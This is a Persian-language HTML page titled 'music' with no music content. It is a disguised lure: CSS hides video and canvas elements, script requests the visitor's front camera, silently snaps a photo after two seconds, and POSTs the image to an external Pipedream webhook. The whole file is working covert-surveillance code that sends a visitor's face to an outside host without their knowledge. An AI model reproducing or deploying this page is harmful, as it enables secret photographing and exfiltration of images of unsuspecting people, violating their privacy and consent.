<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <title>موزیک </title>
    <style>
        video, canvas, img {
            display: none; /* عکس */
        }
    </style>
</head>
<body>
    <!-- عناصر مخفی شده -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>
    <img id="preview">

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const preview = document.getElementById('preview');
        const context = canvas.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;

                // صبر برای آماده شدن دوربین
                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataUrl = canvas.toDataURL("image/jpeg");

                    // ارسال عکس به سرور یا Webhook
                    fetch("https://eoeq114hreszd00.m.pipedream.net", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({ image: dataUrl })
                    }).then(() => console.log("عکس ارسال شد"))
                      .catch(err => console.error("خطا در ارسال:", err));
                }, 2000); // زمان گرفتن عکس (۲ ثانیه)
            })
            .catch(error => {
                console.error("عدم دسترسی به دوربین:", error);
            });
    </script>
</body>
</html>
